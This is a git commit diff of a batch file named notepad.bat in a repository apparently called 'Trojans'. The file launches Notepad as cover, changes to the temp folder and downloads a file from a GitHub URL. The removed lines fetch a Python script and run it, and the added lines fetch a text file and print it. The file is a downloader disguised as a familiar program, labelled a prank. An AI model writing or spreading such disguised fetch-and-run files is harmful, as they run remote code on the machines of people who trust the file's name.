da9df473acf7f178d4c933e5705f62f022c6905b
Nihal Awasthi <137594290+nihalawasthi@users.noreply.github.com>
2024-05-20 22:04:49 +0530

    Update notepad.bat

--- Friendly first/notepad.bat
+++ Friendly first/notepad.bat
@@ -1,5 +1,5 @@
 @echo off
 powershell -Command "notepad"
 cd %TEMP%
-Powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/nihalawasthi/Trojans/main/Friendly%20first/prank.py' -OutFile prank.py"
-python3 prank.py
+Powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/nihalawasthi/Trojans/main/Friendly%20first/prank.txt' -OutFile prank.txt"
+powershell -Command "cat prank.txt"
